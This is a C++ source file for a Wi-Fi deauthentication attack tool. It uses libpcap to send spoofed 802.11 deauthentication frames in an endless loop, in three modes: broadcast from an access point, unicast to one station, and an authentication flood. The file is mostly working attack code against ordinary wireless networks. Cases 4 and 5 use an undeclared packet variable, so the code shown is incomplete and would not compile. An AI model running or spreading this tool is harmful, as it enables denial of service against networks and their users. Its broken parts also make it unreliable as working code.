#include <cstdio>
#include <fstream>
#include <pcap.h>
#include <string>
#include <vector>
#include <cstdint>
#include <chrono>
#include <thread>
#include "radiotap.h"

using namespace std;

void usage() {
	printf("syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n");
	printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

int main(int argc, char* argv[]) {
	if (argc != 3 && argc != 4 && argc != 5) {
		usage();
		return -1;
	}

    char* dev = argv[1];
    uint8_t APMAC[6];
    sscanf(argv[2], "%x:%x:%x:%x:%x:%x", &APMAC[0], &APMAC[1], &APMAC[2], &APMAC[3], &APMAC[4], &APMAC[5]);
	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, 0, 0, 0, errbuf);
    
    if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
    }

    Radiotap radiotap;

    switch (argc) {
    case 3: {
        printf("[AP broadcast attack]\n");

        Deauthentication broadDeauth;

        for (int i = 0; i < 6; i++) {
            broadDeauth.sourAddr[i] = APMAC[i];
            broadDeauth.BSSID[i] = APMAC[i];
        }

        TestPacket testpacket = {
            radiotap,
            broadDeauth
        };

        while (true) {
            int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&testpacket), sizeof(testpacket));
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
            }

            chrono::milliseconds sleepDuration(100);
            this_thread::sleep_for(sleepDuration);
        }

        break;
    }
    case 4: {
        printf("[AP, Station unicast attack]\n");




        while (true) {
            int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&testpacket), sizeof(testpacket));
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
            }

            chrono::milliseconds sleepDuration(100);
            this_thread::sleep_for(sleepDuration);
        }

        break;
    }
    case 5: {
        printf("[Authentication attack]\n");



        while (true) {
            int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&testpacket), sizeof(testpacket));
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
            }

            chrono::milliseconds sleepDuration(100);
            this_thread::sleep_for(sleepDuration);
        }

        break;
    }
    default:
        break;
    }

	pcap_close(pcap);
}